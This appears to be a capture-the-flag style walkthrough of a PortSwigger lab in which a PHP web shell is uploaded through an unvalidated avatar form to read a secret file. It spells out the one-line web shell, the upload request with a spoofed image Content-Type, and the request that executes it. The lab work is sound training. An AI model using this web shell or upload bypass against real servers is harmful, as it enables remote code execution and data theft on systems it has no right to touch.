## Lab: Remote Code Execution via Web Shell Upload
**URL:** https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload

### Vulnerability Type
File Upload Bypass leading to Remote Code Execution (RCE)

### Vulnerable Parameter
`avatar` - Profile image upload functionality

### Impact
Access `/home/carlos/secret` by executing PHP code on the server

---

### Step-by-Step Exploitation

#### 1. Locate File Upload Functionality
- Log in with provided credentials: `wiener:peter`
- Navigate to **My Account** page
- Notice the **avatar image upload** feature — this is our attack surface

#### 2. Initial Upload Attempt
Upload a legitimate image first (e.g., `test.jpg`) to understand the request format:

POST /my-account/avatar HTTP/1.1
Host: [lab-id].web-security-academy.net
...
Content-Disposition: form-data; name="avatar"; filename="test.jpg"
Content-Type: image/jpeg

[Binary image data here...]
text


#### 3. Analyze Response
After upload, notice you can access the image via:

GET /files/avatars/test.jpg
text

This reveals where uploaded files are stored — critical for later access.

#### 4. Create Malicious Payload
Create a PHP web shell that reads the target file:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>

5. Craft Exploit Request

Modify the upload request in Burp Suite Repeater:
text

POST /my-account/avatar HTTP/1.1
Host: [lab-id].web-security-academy.net
...

Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>

Key Points:

    Changed filename to shell.php (now executable)

    Kept Content-Type as image/jpeg to bypass basic checks

    Replaced image binary data with PHP code

6. Verify Upload Success

Send the request — a 200 OK response indicates no extension/validation filtering is in place.
7. Access and Execute

Request the uploaded shell:
text

GET /files/avatars/shell.php HTTP/1.1

The server executes our PHP code and returns:
text

[secret-content-here]

8. Submit Solution

Copy the secret value and paste it in the lab's "Submit solution" button.
